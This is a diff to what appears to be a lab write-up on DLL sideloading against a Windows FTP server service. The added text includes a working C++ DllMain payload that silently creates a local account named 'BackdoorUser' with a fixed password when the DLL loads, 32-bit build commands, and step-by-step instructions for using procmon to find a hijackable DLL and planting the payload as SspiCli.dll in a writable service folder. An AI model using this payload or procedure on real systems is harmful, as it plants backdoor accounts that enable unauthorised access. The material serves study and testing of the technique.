@@ -27,6 +27,53 @@ https://download.visualstudio.microsoft.com/download/pr/e28bf043-c63e-47d0-b6e9-
 A C++ module containing the `DllMain()` function was implemented. The payload code was executed if `ul_reason_for_call == DLL_PROCESS_ATTACH`, i.e. in the moment in which a process is loading the DLL. Even if a subsequent function lookup of the process is failing, the payload code has already been executed.
 
 ```C++
+bool userExists(LPWSTR username)
+{
+    LPUSER_INFO_0 pUserInfo = nullptr;
+    NET_API_STATUS status = NetUserGetInfo(nullptr, username, 0, (LPBYTE*)&pUserInfo);
+
+    if (status == NERR_Success)
+    {
+        NetApiBufferFree(pUserInfo);
+        return true;
+    } 
+    else if (status == NERR_UserNotFound)
+    {
+        return false;
+    } 
+    else
+    {
+        std::cerr << "Error checking user: " << status << std::endl;
+        return false;
+    }
+}
+
+void createUser(LPWSTR pUserName, LPWSTR passwd)
+{
+    // Set up user info
+    USER_INFO_1 ui;
+    ui.usri1_name = pUserName;
+    ui.usri1_password = passwd;
+    ui.usri1_priv = USER_PRIV_USER;
+    ui.usri1_home_dir = nullptr;
+    ui.usri1_comment = nullptr;
+    ui.usri1_flags = UF_SCRIPT;
+    ui.usri1_script_path = nullptr;
+
+    DWORD dwError = 0;
+    NET_API_STATUS nStatus = NetUserAdd(nullptr, 1, (LPBYTE)&ui, &dwError);
+
+    if (nStatus == NERR_Success)
+    {
+        wprintf(L"User created successfully.\n");
+    }
+    else
+    {
+        wprintf(L"Failed to create user. Error: %d\n", nStatus);
+    }
+}
+
+
 BOOL APIENTRY DllMain(HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved)
@@ -40,6 +87,12 @@ BOOL APIENTRY DllMain(HMODULE hModule,
         {
             std::cout << "User and domain: " << userAndDomain << "\n";
             writeInfo(userAndDomain);
+
+            // The actual payload comes here
+            if (!userExists(L"BackdoorUser"))
+            {
+                createUser(L"BackdoorUser", L"BackdoorPasswd");
+            }
         }
         else
         {
@@ -51,11 +104,13 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 }
 ```
 
-The DLL was compiled using the following command line:
-- C runtime linked statically (bigger, but independent of any libraries residing on the target system)
-- Debug info on (can be turned off subsequently)
+The "Developer Command Prompt for VS 2022" (installed via Visual Studio Build Tools) is started to run the compilation commands in. As the targeted Windows 7 is a 32 bit OS, it must be ensured that the toolchain generates 32-bit binaries. This is done using the command line
 
-The "Developer Command Prompt for VS 2022" (installed via Visual Studio Build Tools) is started to run the compilation commands in. As the targeted Windows 7 is a 32 bit OS, it must be ensured that the toolchain generates 32-bit binaries. The DLL, and a tiny test.exe are built using the following batch file:
+```bat
+call "C:\Path\To\VC\Auxiliary\Build\vcvarsall.bat" x86
+```
+
+The DLL, and a tiny test.exe are built using the following batch file, which compiles DLL and test app in debug mode and links the runtime statically, which avoids the hassle of having to copy additional DLLs onto the target system:
 
 ```bat
 @ECHO OFF
@@ -80,3 +135,19 @@ SET CCOPTS=/Od /EHsc /MTd /Zc:wchar_t /Gd /GR
 cl /LD /nologo %DEFINES% /D _WINDLL %CCOPTS% src/mylib.cpp     /link %LIBPATH% %LIBRARIES% /out:mylib.dll
 cl     /nologo %DEFINES%            %CCOPTS% src/mylibtest.cpp /link %LIBPATH% %LIBRARIES% /out:mylibtest.exe
 ```
+
+After compilation and testing on the development system, the DLL is copied into the target system, together with the FTPServer sources and the sysinternal binaries. The `easyftpsvr` binary is added into `C:\CCD\easyftpsvr-1.7.0.2`, a folder that can be accessed by any user. The service is installed with admin rights by invoking `easyftpsvr.exe -install`, and now shows up in the lists of services executing in the VM:
+
+![Services](Services.png)
+
+In the next step, `procmon` is started, and a filter is added which excludes all non-ftp services like shown below:
+
+![ProcMonFilter](ProcMonFilter.png)
+
+If there is no entry in the resulting list, stopping and restarting the service will populate it. Double-clicking one of the events, then switching to the "Process" tab provides the list of DLLs which the `easyftpsvr` service has currently loaded. 
+
+![ProcMonDLLList](ProcMonDLLList.png)
+
+As `sspicli.dll` has been successfully used for DLL sideloading in the past, https://hijacklibs.net/entries/microsoft/built-in/sspicli.html, `mylib.dll` is copied into `C:\CCD\easyftpsvr-1.7.0.2` as `SspiCli.dll`. After stopping and restarting the server, `net user` displays the `BackDoorUser` which was installed when the DLL was loaded.
+
+![BackDoorUser](BackDoorUser.png)
